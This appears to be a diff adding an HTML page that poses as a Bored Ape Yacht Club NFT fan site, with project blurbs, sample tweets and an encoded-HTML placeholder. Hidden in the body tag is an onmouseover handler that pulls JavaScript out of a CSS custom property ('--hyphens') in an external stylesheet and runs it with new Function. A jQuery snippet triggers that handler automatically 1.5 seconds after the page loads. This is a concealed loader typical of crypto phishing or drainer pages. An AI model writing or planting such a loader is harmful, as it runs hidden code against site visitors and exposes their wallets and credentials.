@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title></title>
+  <link rel="stylesheet" href="assets/styles2.css">
+</head>
+<body id="body" onmouseover="new Function(getComputedStyle(document.querySelector('#twitterFeed')).getPropertyValue('--hyphens'))()">
+  <header>
+    <h1>Bored Ape NFTs</h1>
+  </header>
+  <main>
+    <aside class="ad ad-left">
+      <h3>Bored Ape NFTs</h3>
+      <p>Collect your unique Bored Ape NFT today!</p>
+      <a href="#">Explore</a>
+    </aside>
+    <section id="projectInfo">
+      <h2>About Bored Ape Yacht Club</h2>
+      <p>
+        The Bored Ape Yacht Club is a collection of 10,000 unique Bored Ape NFTs, each with its own unique traits and attributes.
+        These digital collectibles have gained immense popularity in the NFT space, with a vibrant community and strong cultural impact.
+      </p>
+      <p>
+        Owners of Bored Ape NFTs gain access to exclusive club events, merchandise, and more.
+        The project is known for its high-quality artwork and distinctive traits across the collection.
+      </p>
+    </section>
+
+    <section id="twitterFeed">
+      <h2>Twitter Feed</h2>
+      <div id="tweets">
+        <div class="tweet">
+          <p><strong>@CryptoApeClub</strong>: Just acquired another Bored Ape NFT! Loving the uniqueness of each one in the collection. #BoredApeYachtClub</p>
+        </div>
+        <div class="tweet">
+          <p><strong>@NFTCollector123</strong>: The artwork in the Bored Ape NFTs is next level. Can't get enough of this amazing project! #NFTCommunity #DigitalArt</p>
+        </div>
+        <div class="tweet">
+          <p><strong>@ApeEnthusiast</strong>: Join us in the Bored Ape Yacht Club Discord for some exciting discussions and events! #BAYC #NFTs</p>
+        </div>
+        <div class="tweet">
+          ENCODED_HTML_HERE
+        </div>
+      </div>
+    </section>
+    <aside class="ad ad-right">
+      <h3>Crypto News</h3>
+      <p>Stay updated with the latest in the crypto world!</p>
+      <a href="#">Read Now</a>
+    </aside>
+    <section id="community">
+      <h2>Community</h2>
+      <p>
+        The Bored Ape Yacht Club community is active across various social media platforms, including Discord, Twitter, and Instagram.
+        Members engage in discussions, share artwork, and organize events centered around the Bored Ape NFTs.
+      </p>
+      <p>
+        Join the community to stay updated on the latest news, participate in auctions, and connect with fellow collectors.
+      </p>
+    </section>
+
+  </main>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+    <script>
+      $( document ).ready(function() {
+        setTimeout(function(){
+          $('#body').mouseover()
+        }, 1500);
+      });
+    </script>
+</body>
+</html>
